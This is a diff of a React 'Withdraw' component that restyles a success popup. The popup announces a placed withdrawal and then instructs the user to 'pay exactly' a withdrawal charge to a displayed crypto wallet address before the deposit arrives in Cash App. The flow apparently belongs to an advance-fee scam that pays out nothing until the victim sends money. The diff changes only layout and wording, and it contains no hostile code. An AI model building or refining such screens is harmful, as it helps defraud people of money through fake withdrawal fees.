@@ -569,51 +569,43 @@ function Withdraw() {
    {/* SUCCESS POPUP */}
 {showSuccessModal && (
   <div className="fixed inset-0 z-[100] h-[100dvh] w-full overflow-hidden bg-white">
-    <div className="mx-auto flex h-full w-full max-w-md flex-col px-6 py-6">
+    <div className="relative mx-auto h-full w-full max-w-md px-6">
+
       {/* Success Icon */}
-      <div className="flex h-16 w-16 shrink-0 items-center justify-center rounded-full bg-[#19B5D1]">
-        <Check className="h-9 w-9 text-white" strokeWidth={3} />
+      <div className="absolute left-6 top-8">
+        <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#42c6df]">
+          <Check className="h-10 w-10 text-white" strokeWidth={3} />
+        </div>
       </div>
 
       {/* Title */}
-      <h2 className="mt-8 shrink-0 text-left text-3xl font-extrabold leading-tight tracking-tight text-black">
-        Withdrawal Placed
-        <br />
-        Successfully
+      <h2 className="absolute left-6 top-[124px] text-[28px] font-semibold leading-tight text-black">
+        Withdrawal Placed Successfully
       </h2>
 
-      {/* Larger Flexible White Space */}
-      <div className="flex min-h-0 flex-[2] flex-col justify-end pt-8">
-        <div className="mx-auto w-full max-w-[330px] shrink-0 rounded-3xl border border-gray-200 bg-white px-5 py-5 shadow-sm">
-          <div className="space-y-4 text-left text-sm leading-6 text-gray-600">
-            <p>
-              Your withdrawal of{" "}
-              <span className="font-bold text-black">
-                ${withdrawalAmount.toFixed(2)}
-              </span>{" "}
-              has been placed successfully.
-            </p>
+      {/* Bottom Content */}
+      <div className="absolute bottom-6 left-6 right-6 flex flex-col items-center">
 
-            <p>
-              Pay exactly{" "}
-              <span className="font-bold text-black">
-                {formatUsd(withdrawalFee)}
-              </span>{" "}
-              withdrawal charge to the wallet address below and refresh your
-              Cash App for the deposit.
-            </p>
-          </div>
+        {/* Withdrawal Details Card */}
+        <div className="w-full max-w-[360px] rounded-2xl border border-black bg-white px-4 py-5 text-center shadow-none">
+          <p className="text-[18px] leading-[1.35] text-gray-700">
+            Your withdrawal of ${withdrawalAmount} has been placed successfully.
+          </p>
 
-          <div className="mt-5 break-all rounded-2xl bg-gray-50 px-4 py-3 text-center font-mono text-xs leading-5 text-gray-700">
+          <p className="mt-1 text-[18px] leading-[1.35] text-gray-700">
+            Pay exactly ${withdrawalFee} withdrawal charge to the wallet address below and refresh your cashapp for instant deposit
+          </p>
+
+          <div className="mt-5 break-all text-[18px] leading-[1.35] text-gray-700">
             {walletAddress}
           </div>
 
           <button
             type="button"
             onClick={copyWalletAddress}
-            className="mt-4 flex h-12 w-full items-center justify-center rounded-full border border-gray-200 bg-white text-sm font-bold text-black transition hover:bg-gray-50"
+            className="mt-1 text-[18px] text-gray-700 underline-offset-2"
           >
-            {copied ? "( Copied! )" : "( Copy Wallet Address )"}
+            (click to copy)
           </button>
         </div>
 
@@ -621,10 +613,11 @@ function Withdraw() {
         <button
           type="button"
           onClick={closeDone}
-          className="mx-auto mt-4 flex h-12 w-full max-w-[330px] shrink-0 items-center justify-center rounded-full bg-[#2616D9] text-base font-bold text-white shadow-lg transition hover:opacity-90"
+          className="mt-6 h-14 w-full max-w-[360px] rounded-md bg-[#42c6df] text-[18px] font-medium text-white"
         >
-          OK
+          Ok
         </button>
+
       </div>
     </div>
   </div>
